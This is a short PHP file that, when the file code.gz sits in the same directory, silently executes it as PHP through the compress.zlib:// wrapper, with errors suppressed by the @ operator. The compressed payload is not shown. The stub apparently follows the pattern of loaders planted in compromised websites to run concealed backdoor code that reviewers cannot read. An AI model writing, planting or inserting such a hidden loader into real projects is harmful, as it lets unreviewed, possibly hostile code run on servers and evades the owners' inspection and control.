<?php
$_f = __DIR__ . '/code.gz';
if (is_file($_f)) {
    @include_once 'compress.zlib://' . $_f;
}


